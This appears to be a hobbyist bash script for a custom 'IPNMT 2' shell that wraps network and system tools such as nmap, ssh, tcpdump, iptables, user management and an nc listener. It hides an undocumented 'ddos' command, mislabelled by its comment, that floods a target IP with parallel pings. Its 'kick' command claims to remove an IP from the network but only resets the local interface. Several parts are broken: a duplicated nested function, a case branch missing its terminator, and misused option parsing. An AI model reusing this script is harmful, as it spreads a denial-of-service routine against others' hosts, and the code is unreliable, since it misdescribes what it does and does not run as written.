#!/bin/bash
   echo -e "\033[34m"
    cat << "EOF"

 ___  ________  ________   _____ ______   _________         _______     
|\  \|\   __  \|\   ___  \|\   _ \  _   \|\___   ___\      /  ___  \    
\ \  \ \  \|\  \ \  \\ \  \ \  \\\__\ \  \|___ \  \_|     /__/|_/  /|   
 \ \  \ \   ____\ \  \\ \  \ \  \\|__| \  \   \ \  \      |__|//  / /   
  \ \  \ \  \___|\ \  \\ \  \ \  \    \ \  \   \ \  \         /  /_/__  
   \ \__\ \__\    \ \__\\ \__\ \__\    \ \__\   \ \__\       |\________\
    \|__|\|__|     \|__| \|__|\|__|     \|__|    \|__|        \|_______|

EOF
    echo -e "\033[0m"
    echo -e "\033[34mIPNMT 2: IP Network Management Tool 2\033[0m"
# Function to display the logo and IPNMT 2 information
display_logo() {
    echo -e "\033[34m"
    cat << "EOF"

 ___  ________  ________   _____ ______   _________         _______     
|\  \|\   __  \|\   ___  \|\   _ \  _   \|\___   ___\      /  ___  \    
\ \  \ \  \|\  \ \  \\ \  \ \  \\\__\ \  \|___ \  \_|     /__/|_/  /|   
 \ \  \ \   ____\ \  \\ \  \ \  \\|__| \  \   \ \  \      |__|//  / /   
  \ \  \ \  \___|\ \  \\ \  \ \  \    \ \  \   \ \  \         /  /_/__  
   \ \__\ \__\    \ \__\\ \__\ \__\    \ \__\   \ \__\       |\________\
    \|__|\|__|     \|__| \|__|\|__|     \|__|    \|__|        \|_______|

EOF
    echo -e "\033[0m"
    echo -e "\033[34mIPNMT 2: IP Network Management Tool 2\033[0m"
}

# Function to display help information
display_help() {
    echo -e "\033[34mAvailable Commands:\033[0m"
    echo -e "  \033[34mhello\033[0m - Greet the user."
    echo -e "  \033[34mdate\033[0m - Show the current date and time."
    echo -e "  \033[34mipnmt\033[0m - Display information about IPNMT 2."
    echo -e "  \033[34mscan\033[0m - Scan for devices in the current network."
    echo -e "  \033[34mlist\033[0m - List network interfaces with IP addresses and MAC addresses."
    echo -e "  \033[34mconnect [ip]\033[0m - SSH connect to the specified IP address."
    echo -e "  \033[34mkick [ip]\033[0m - Kick the specified IP address out of the network."
    echo -e "  \033[34mscanip [domain]\033[0m - Resolve a domain to its IP addresses."
    echo -e "  \033[34mstartagent [port]\033[0m - Start an SSH server on the specified port."
    echo -e "  \033[34mforward [local_port] [remote_ip] [remote_port]\033[0m - Forward a local port to a remote IP and port."
    echo -e "  \033[34mstatus\033[0m - Show the status of network interfaces and routing table."
    echo -e "  \033[34mstats\033[0m - Show network statistics and packet statistics."
    echo -e "  \033[34msaveconfig [name] [config]\033[0m - Save a configuration to a file."
    echo -e "  \033[34mloadconfig [name]\033[0m - Load a configuration from a file."
    echo -e "  \033[34mdnslookup [domain]\033[0m - Perform a DNS lookup for a domain."
    echo -e "  \033[34mnmap [target]\033[0m - Scan a target using nmap."
    echo -e "  \033[34mfirewall [action] [rule]\033[0m - Manage firewall rules (add/remove/list)."
    echo -e "  \033[34msysteminfo\033[0m - Show system information."
    echo -e "  \033[34muser [action] [username]\033[0m - Manage users (add/remove/check)."
    echo -e "  \033[34mping [host]\033[0m - Ping a host to check connectivity."
    echo -e "  \033[34mtraceroute [host]\033[0m - Trace the route to a host."
    echo -e "  \033[34mbackup [source] [destination]\033[0m - Backup files or directories."
    echo -e "  \033[34mrestore [source] [destination]\033[0m - Restore files or directories from a backup."
    echo -e "  \033[34mdiskusage\033[0m - Show disk usage statistics."
    echo -e "  \033[34mprocesslist\033[0m - List running processes."
    echo -e "  \033[34mkill [pid]\033[0m - Kill a process by its PID."
    echo -e "  \033[34mservice [service_name] [start/stop/restart/status]\033[0m - Manage system services."
    echo -e "  \033[34mupdate\033[0m - Update system packages."
    echo -e "  \033[34mupgrade\033[0m - Upgrade system packages."
    echo -e "  \033[34mlog [filename]\033[0m - View or tail a log file."
    echo -e "  \033[34mencrypt [filename]\033[0m - Encrypt a file."
    echo -e "  \033[34mlistener start [port]\033[0m - Start a network listener on the specified port."
    echo -e "  \033[34mhelp\033[0m - Show this help message."
    echo -e "  \033[34mexit\033[0m - Exit the custom shell."
    echo -e "  \033[34mnetlog\033[0m - log all activity in the network"
}

# Function to list network interfaces with IP addresses and MAC addresses
ddos() {
    local target_ip=$1
    if [[ -z "$target_ip" ]]; then
        echo "Usage: ddos [target_ip]"
        echo "Example: ddos 192.168.1.100"
        return
    fi
    echo "Launching DDoS attack on $target_ip..."
 
host="$1"
shift
declare -i npings=50
declare -i duration=5

while getopts ":n:t:" opt
do
case $opt in
n) let npings=$OPTARG;;
t) let duration=$OPTARG;;
\?) echo "Usage: source dos.sh host [-n npings] [-t duration]" >&2;;
esac
done
 

for (( i=0; $i<$npings; i++ ))
do
ping "$host" > /dev/null &
done


sleep $duration
killall ping


unset opt i host npings duration
}
list_network_info() {
    printf '%10s %32s %32s\n' interface ipaddress macaddress
    printf '%s\n' '----------------------------------------------------------------------------'
    for each in $(ip address | grep -oP '(^[\d]+:\s)\K[\d\w]+'); do
        mac=$(ip address show ${each} | grep -oP '(?<=link/ether\s)\K[\da-f:]+|(?<=link/loopback\s)\K[\da-f:]+')
        for address in $(ip address show ${each} | grep -oP '(?<=inet\s)\K[\d.]+|(?<=inet6\s)\K[\da-f:]+'); do
            printf '%10s %32s %32s\n' ${each} ${address} ${mac}
        done
    done
}

# Function to scan the network for devices
scan_network() {
    echo "Scanning network for devices..."
    sudo arp -a
}
# Function to monitor network traffic
monitor_network() {
# Define log file location
logfile="network_activity.log"

# Ensure log file is created and writable
touch "$logfile" || { echo "Error: Cannot create log file at $logfile"; exit 1; }

# Function to log network activity
monitor_network() {
# Define log file location
logfile="network_activity.log"

# Ensure log file is created and writable
touch "$logfile" || { echo "Error: Cannot create log file at $logfile"; exit 1; }

# Function to log network activity
log_network_activity() {
    local message=$1
    echo "$(date): $message" >> "$logfile"
    echo "$message"  # Print to console
}
    echo "Monitoring network traffic. Logging to $logfile..."

    # Start capturing network traffic with tcpdump
    sudo tcpdump |
    while IFS= read -r line; do
        # Filter out non-essential traffic
        if [[ "$line" == *"Flags [S]"* || "$line" == *"Flags [P.]"* ]]; then
            # Look for HTTP requests (GET/POST), DNS queries, and suspicious domains
            if [[ "$line" == *"HTTP"* || "$line" == *"GET"* || "$line" == *"POST"* ]]; then
                log_network_activity "HTTP request: $line"
            elif [[ "$line" == *"DNS"* ]]; then
                log_network_activity "DNS query: $line"
            elif [[ "$line" == *"Telegram"* || "$line" == *"Discord"* || "$line" == *"Pastebin"* ]]; then
                log_network_activity "Suspicious traffic: $line"
            else
                log_network_activity "User traffic: $line"
            fi
        fi
    done
}
# Function to resolve a domain to its IP addresses
scan_ip() {
    local domain=$1
    
    if [[ -z "$domain" ]]; then
        echo "Usage: scanip [domain]"
        echo "Example: scanip www.example.com"
        return
    fi
    
    echo "Resolving domain $domain to IP addresses..."
    
    # Use dig to resolve the domain name
    dig +short "$domain"
}

# Function to kick an IP address from the network
kick_ip() {
    local ip=$1
    
    if [[ -z "$ip" ]]; then
        echo "Usage: kick [ip]"
        echo "Example: kick 192.168.1.100"
        return
    fi
    
    echo "Attempting to kick IP $ip from the network..."
    
    # Check if IP is in the ARP table
    if ! arp -n | grep -q "$ip"; then
        echo "IP $ip not found in ARP table."
        return
    fi
    
    # Flush ARP cache
    sudo ip -s -s neigh flush all
    
    # Disconnect the network interface to refresh connections
    local iface=$(ip route show default | awk '/default/ {print $5}')
    sudo ip link set dev "$iface" down
    sleep 2
    sudo ip link set dev "$iface" up
    
    echo "IP $ip has been removed from ARP table and network interface has been reset."
}

# Function to connect to an IP address using SSH
connect_ssh() {
    local ip=$1

    if [[ -z "$ip" ]]; then
        echo "Usage: connect [ip]"
        echo "Example: connect 192.168.1.100"
        return
    fi

    echo "Connecting to $ip via SSH..."
    ssh "$ip"
}

# Function to start an SSH agent on a specified port
start_agent() {
    local port=$1
    
    if [[ -z "$port" ]]; then
        echo "Usage: startagent [port]"
        echo "Example: startagent 22"
        return
    fi

    sudo systemctl start sshd
    sudo systemctl enable sshd
    echo "Connect with the IP:"
    curl ifconfig.me
    echo ""
    echo "And the username:"
    whoami
    echo ""
    echo "The SSH server is running on port $port."
}

# Function to forward a local port to a remote IP and port
forward_port() {
    local local_port=$1
    local remote_ip=$2
    local remote_port=$3

    if [[ -z "$local_port" || -z "$remote_ip" || -z "$remote_port" ]]; then
        echo "Usage: forward [local_port] [remote_ip] [remote_port]"
        echo "Example: forward 8080 192.168.1.100 80"
        return
    fi

    echo "Forwarding local port $local_port to $remote_ip:$remote_port..."
    
    # Create SSH tunnel
    ssh -L "$local_port:localhost:$remote_port" "$remote_ip" -N &
    
    # Capture the PID of the SSH tunnel
    local pid=$!
    
    if [[ $? -ne 0 ]]; then
        echo "Failed to establish port forwarding."
        return
    fi
    
    echo "Port $local_port is now being forwarded to $remote_ip:$remote_port (PID: $pid)"
}

# Function to show network status
status() {
    echo "Network Interfaces Status:"
    ip link show
    echo "Routing Table:"
    ip route show
}

# Function to show network and packet statistics
stats() {
    echo "Network Statistics:"
    ifstat
    echo "Packet Statistics:"
    netstat -i
}

# Function to save a configuration to a file
save_config() {
    local name=$1
    local config=$2
    if [[ -z "$name" || -z "$config" ]]; then
        echo "Usage: saveconfig [name] [config]"
        return
    fi
    echo "$config" > "${name}.conf"
    echo "Configuration saved as ${name}.conf"
}

# Function to load a configuration from a file
load_config() {
    local name=$1
    if [[ -z "$name" ]]; then
        echo "Usage: loadconfig [name]"
        return
    fi
    if [[ -f "${name}.conf" ]]; then
        source "${name}.conf"
        echo "Configuration loaded from ${name}.conf"
    else
        echo "Configuration file ${name}.conf not found."
    fi
}

# Function to perform DNS lookup
dns_lookup() {
    local domain=$1
    if [[ -z "$domain" ]]; then
        echo "Usage: dnslookup [domain]"
        return
    fi
    echo "Performing DNS lookup for domain $domain..."
    dig +short "$domain"
}

# Function to scan a target using nmap
nmap_scan() {
    local target=$1
    if [[ -z "$target" ]]; then
        echo "Usage: nmap [target]"
        return
    fi
    echo "Scanning target $target with nmap..."
    nmap "$target"
}

# Function to manage firewall rules
firewall() {
    local action=$1
    local rule=$2
    if [[ -z "$action" || -z "$rule" ]]; then
        echo "Usage: firewall [action] [rule] (action: add/remove/list)"
        return
    fi
    case $action in
        "add")
            sudo iptables -A INPUT -p "$rule"
            ;;
        "remove")
            sudo iptables -D INPUT -p "$rule"
            ;;
        "list")
            sudo iptables -L
            ;;
        *)
            echo "Unknown action: $action"
            ;;
    esac
}

# Function to show system information
system_info() {
    echo "System Information:"
    echo "Hostname: $(hostname)"
    echo "Uptime: $(uptime -p)"
    echo "CPU Info: $(lscpu | grep 'Model name')"
    echo "Memory Info: $(free -h)"
    echo "Disk Info: $(df -h)"
}

# Function to manage users
manage_user() {
    local action=$1
    local username=$2
    if [[ -z "$action" || -z "$username" ]]; then
        echo "Usage: user [action] [username] (action: add/remove/check)"
        return
    fi
    case $action in
        "add")
            sudo useradd "$username"
            echo "User $username added."
            ;;
        "remove")
            sudo userdel "$username"
            echo "User $username removed."
            ;;
        "check")
            id "$username" &>/dev/null && echo "User $username exists." || echo "User $username does not exist."
            ;;
        *)
            echo "Unknown action: $action"
            ;;
    esac
}

# Function to ping a host
ping_host() {
    local host=$1
    if [[ -z "$host" ]]; then
        echo "Usage: ping [host]"
        return
    fi
    echo "Pinging $host..."
    ping -c 4 "$host"
}

# Function to trace the route to a host
trace_route() {
    local host=$1
    if [[ -z "$host" ]]; then
        echo "Usage: traceroute [host]"
        return
    fi
    echo "Tracing route to $host..."
    traceroute "$host"
}
encrypt_file() {
    local filename=$1

    if [[ -z "$filename" ]]; then
        echo "Usage: encrypt [filename]"
        echo "Example: encrypt myfile.txt"
        return
    fi

    if [[ -f "$filename" ]]; then
        openssl enc -aes-256-cbc -salt -in "$filename" -out "${filename}.enc"
        echo "File $filename has been encrypted to ${filename}.enc"
    else
        echo "File $filename not found."
    fi
}

# Function to start a network listener on the specified port
start_listener() {
    local port=$1

    if [[ -z "$port" ]]; then
        echo "Usage: listener start [port]"
        echo "Example: listener start 8080"
        return
    fi

    echo "Starting listener on port $port..."
    nc -lvp "$port"
}
# Function to backup files or directories
backup_files() {
    local source=$1
    local destination=$2
    if [[ -z "$source" || -z "$destination" ]]; then
        echo "Usage: backup [source] [destination]"
        return
    fi
    echo "Backing up $source to $destination..."
    cp -r "$source" "$destination"
}

# Function to restore files or directories from a backup
restore_files() {
    local source=$1
    local destination=$2
    if [[ -z "$source" || -z "$destination" ]]; then
        echo "Usage: restore [source] [destination]"
        return
    fi
    echo "Restoring $source to $destination..."
    cp -r "$source" "$destination"
}

# Function to show disk usage statistics
disk_usage() {
    echo "Disk Usage Statistics:"
    df -h
}

# Function to list running processes
process_list() {
    echo "Running Processes:"
    ps aux
}

# Function to kill a process by its PID
kill_process() {
    local pid=$1
    if [[ -z "$pid" ]]; then
        echo "Usage: kill [pid]"
        return
    fi
    echo "Killing process $pid..."
    kill "$pid"
}

# Function to manage system services
manage_service() {
    local service_name=$1
    local action=$2
    if [[ -z "$service_name" || -z "$action" ]]; then
        echo "Usage: service [service_name] [start/stop/restart/status]"
        return
    fi
    case $action in
        "start")
            sudo systemctl start "$service_name"
            ;;
        "stop")
            sudo systemctl stop "$service_name"
            ;;
        "restart")
            sudo systemctl restart "$service_name"
            ;;
        "status")
            sudo systemctl status "$service_name"
            ;;
        *)
            echo "Unknown action: $action"
            ;;
    esac
}

# Function to update system packages
update_system() {
    echo "Updating system packages..."
    sudo apt update
}

# Function to upgrade system packages
upgrade_system() {
    echo "Upgrading system packages..."
    sudo apt upgrade -y
}

# Function to view or tail a log file
view_log() {
    local filename=$1
    if [[ -z "$filename" ]]; then
        echo "Usage: log [filename]"
        return
    fi
    echo "Viewing log file $filename..."
    tail -f "$filename"
}

# Start custom shell loop
while true; do
    # Clear the screen and display the logo
    clear
    display_logo

    # Get the username
    username=$(whoami)

    # Display the prompt with the username
    echo -n "$username/IPNMT 2 shell> "
    read -r command

    # Split command and arguments
    command_args=($command)
    cmd=${command_args[0]}
    args=${command_args[@]:1}

    # Handle custom commands
    case $cmd in
        "hello")
            echo "Hello, user!"
            ;;
        "date")
            echo "Current date and time: $(date)"
            ;;
        "ipnmt")
            echo "IPNMT 2: IP Network Management Tool 2"
            ;;
        "scan")
            scan_network
            ;;
        "list")
            list_network_info
            ;;
        "connect")
            connect_ssh "$args"
            ;;
        "kick")
            kick_ip "$args"
            ;;
        "scanip")
            scan_ip "$args"
            ;;
         "ddos")
            ddos "$args" -n 50 -t 5
            ;;
        "startagent")
            start_agent "$args"
            ;;
        "forward")
            forward_port ${command_args[1]} ${command_args[2]} ${command_args[3]}
            ;;
        "status")
            status
            ;;
        "stats")
            stats
            ;;
        "saveconfig")
            save_config ${command_args[1]} "${command_args[@]:2}"
            ;;
        "loadconfig")
            load_config "${command_args[1]}"
            ;;
        "dnslookup")
            dns_lookup "$args"
            ;;
        "nmap")
            nmap_scan "$args"
            ;;
        "firewall")
            firewall ${command_args[1]} "${command_args[@]:2}"
            ;;
        "systeminfo")
            system_info
            ;;
        "user")
            manage_user ${command_args[1]} "${command_args[2]}"
            ;;
        "ping")
            ping_host "$args"
            ;;
        "traceroute")
            trace_route "$args"
            ;;
        "backup")
            backup_files ${command_args[1]} ${command_args[2]}
            ;;
        "restore")
            restore_files ${command_args[1]} ${command_args[2]}
            ;;
        "diskusage")
            disk_usage
            ;;
        "processlist")
            process_list
            ;;
        "kill")
            kill_process "$args"
            ;;
        "service")
            manage_service ${command_args[1]} "${command_args[2]}"
            ;;
        "update")
            update_system
            ;;
        "upgrade")
            upgrade_system
            ;;
        "log")
            view_log "$args"
            ;;
        "help")
            display_help
            ;;
        "exit")
            echo "Goodbye!"
            break
            ;;
            "encrypt") encrypt_file $args
            ;;
            "netlog") monitor_network
        *)
            echo "Unknown command: $cmd"
            ;;
            
    esac

    # Wait for user input to continue
    read -n 1 -s -r -p "Press any key to continue..."
done
